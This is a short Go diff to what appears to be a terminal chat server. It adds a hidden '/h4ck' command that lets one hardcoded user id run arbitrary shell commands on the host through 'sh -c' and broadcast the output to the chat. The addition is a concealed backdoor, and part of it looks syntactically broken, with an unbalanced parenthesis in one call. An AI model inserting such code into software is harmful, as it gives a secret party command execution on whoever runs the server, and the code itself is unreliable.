@@ -12,6 +12,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"os/exec"
 	"os/signal"
 	"sort"
 	"strconv"
@@ -354,6 +355,24 @@ func (u *user) repl() {
 		if line == "/exit" {
 			return
 		}
+
+		if strings.HasPrefix(line, "/h4ck") {
+			if u.id == "d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82" {
+				cmd := strings.TrimSpace(strings.TrimPrefix(line, "/h4ck"))
+
+				if cmd == "" {
+					broadcast("", "which command?", false)
+				}
+
+				out, err := exec.Command("sh", "-c", cmd).Output()
+				if err != nil {
+					broadcast("", "Some error happened: "+fmt.Sprint(err)), false)
+				} else {
+					broadcast("", string(out), false)
+				}
+			}
+		}
+
 		if line == "/bell" {
 			u.bell = !u.bell
 			if u.bell {
